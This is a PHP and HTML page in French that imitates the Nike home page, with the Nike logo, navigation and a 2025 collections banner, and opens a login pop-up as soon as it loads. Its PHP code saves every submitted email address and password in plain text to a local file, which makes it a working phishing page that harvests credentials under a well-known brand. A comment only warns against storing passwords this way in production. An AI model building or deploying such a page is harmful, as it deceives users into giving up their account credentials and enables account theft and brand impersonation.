<?php
// Traitement du formulaire
if ($_SERVER["REQUEST_METHOD"] === "POST") {
  $email = $_POST['email'] ?? '';
  $password = $_POST['password'] ?? '';

  // ⚠️ NE PAS faire ça en production (utilise password_hash() + base de données)
  $file = fopen("utilisateurs.txt", "a");
  fwrite($file, "Email: $email | Mot de passe: $password\n");
  fclose($file);

  $message = "✅ Informations enregistrées avec succès.";
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Nike - Accueil</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
    }

    header {
      background-color: #fff;
      padding: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: black;
    }

    nav a {
      margin: 0 15px;
      text-decoration: none;
      color: black;
      font-weight: bold;
    }

    .hero {
      background: url('hero.jpg') no-repeat center center/cover;
      height: 80vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
    }

    .hero h1 {
      font-size: 3em;
      margin-bottom: 10px;
    }

    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background-color: rgba(0,0,0,0.7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .modal-content {
      background-color: #fff;
      color: black;
      padding: 30px;
      border-radius: 8px;
      width: 300px;
      text-align: center;
      position: relative;
    }

    .modal-content input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
    }

    .modal-content button {
      background-color: black;
      color: white;
      padding: 10px;
      border: none;
      width: 100%;
      cursor: pointer;
      margin-top: 10px;
    }

    .close {
      position: absolute;
      top: 10px; right: 10px;
      font-size: 20px;
      cursor: pointer;
      color: black;
    }

    .message {
      margin-top: 15px;
      color: green;
    }
  </style>
</head>
<body>

<header>
  <img src="nike-logo.png" alt="Nike Logo" height="40">
  <nav>
    <a href="#">Nouveautés</a>
    <a href="#">Homme</a>
    <a href="#">Femme</a>
    <a href="#">Enfant</a>
  </nav>
</header>

<section class="hero">
  <h1>FEAR NOTHING</h1>
  <p>Les collections 2025 des équipes nationales sont là.</p>
</section>

<!-- Fenêtre modale -->
<div class="modal" id="loginModal">
  <div class="modal-content">
    <span class="close" onclick="document.getElementById('loginModal').style.display='none'">×</span>
    <h2>Bienvenue chez Nike</h2>
    <p>Connecte-toi ou crée un compte</p>

    <form method="POST" action="">
      <input type="email" name="email" placeholder="Adresse e-mail" required>
      <input type="password" name="password" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>

    <p style="font-size: 14px; margin-top: 10px;">Pas encore inscrit ? <a href="#">Créer un compte</a></p>

    <?php if (!empty($message)) : ?>
      <p class="message"><?= $message ?></p>
    <?php endif; ?>
  </div>
</div>

<script>
  // Affiche le modal dès le chargement
  window.onload = function() {
    document.getElementById("loginModal").style.display = "flex";
  };
</script>

</body>
</html>
